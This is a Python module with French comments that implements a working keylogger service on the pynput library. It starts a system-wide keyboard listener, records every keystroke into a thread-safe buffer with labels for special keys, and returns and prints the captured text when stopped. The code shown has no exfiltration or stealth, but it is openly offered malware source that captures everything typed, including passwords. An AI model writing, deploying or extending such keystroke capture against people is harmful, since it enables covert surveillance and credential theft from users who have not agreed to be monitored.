# Ce module implémente un service de keylogger basé sur pynput.
# Il écoute les événements clavier du système et stocke les frappes
# dans un buffer mémoire. Les touches spéciales (Ctrl, Enter, etc.)
# sont traduites en labels lisibles pour faciliter l’analyse.
# Le service peut être démarré et arrêté dynamiquement.

from pynput import keyboard
from threading import Lock


# Mapping des touches spéciales vers une représentation lisible
# afin d’éviter les caractères non interprétables dans le buffer.
SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "[enter]\n",
    keyboard.Key.tab: "[tab]",
    keyboard.Key.backspace: "[backspace]",
    keyboard.Key.delete: "[delete]",
    keyboard.Key.esc: "[esc]",
    keyboard.Key.shift: "[shift]",
    keyboard.Key.shift_r: "[shift]",
    keyboard.Key.ctrl: "[ctrl]",
    keyboard.Key.ctrl_r: "[ctrl]",
    keyboard.Key.alt: "[alt]",
    keyboard.Key.alt_r: "[alt]",
    keyboard.Key.cmd: "[cmd]",
    keyboard.Key.cmd_r: "[cmd]",
    keyboard.Key.up: "[up]",
    keyboard.Key.down: "[down]",
    keyboard.Key.left: "[left]",
    keyboard.Key.right: "[right]",
    keyboard.Key.home: "[home]",
    keyboard.Key.end: "[end]",
    keyboard.Key.page_up: "[page_up]",
    keyboard.Key.page_down: "[page_down]",
}


class KeyloggerService:

    def __init__(self):

        # Listener clavier (thread interne pynput)
        self._listener = None

        # État du keylogger (actif / inactif)
        self._running = False

        # Buffer contenant les frappes enregistrées
        self._buffer = []

        # Lock pour éviter les conflits entre threads (listener vs stop)
        self._lock = Lock()

    def start(self):

        # Empêche le lancement multiple du listener
        if self._running:
            return "Keylogger already running"

        # Reset du buffer avant démarrage
        self._buffer.clear()

        # Création du listener clavier
        self._listener = keyboard.Listener(on_press=self._on_press)

        # Démarrage en thread séparé (non bloquant)
        self._listener.start()

        self._running = True

        return "Keylogger started"

    def stop(self):

        # Vérifie que le keylogger est actif
        if not self._running:
            return "Keylogger not running"

        # Arrêt du listener clavier
        self._listener.stop()

        self._running = False

        # Lecture sécurisée du buffer
        with self._lock:

            data = "".join(self._buffer)

            # Debug (optionnel)
            print("BUFFER:", data)

            # Reset du buffer après extraction
            self._buffer.clear()

        return data

    def _on_press(self, key):

        # Callback appelé à chaque pression de touche
        try:

            # Cas d’une touche alphanumérique classique
            if isinstance(key, keyboard.KeyCode):

                k = key.char

                # Ignore les touches sans caractère (ex: shift isolé)
                if k is None:
                    return

            else:
                # Conversion des touches spéciales en labels lisibles
                k = SPECIAL_KEYS.get(key, f"[{key.name}]")

            # Ajout thread-safe dans le buffer
            with self._lock:
                self._buffer.append(k)

        except Exception as e:

            # Protection contre les erreurs de callback clavier
            print("Keylogger error:", e)
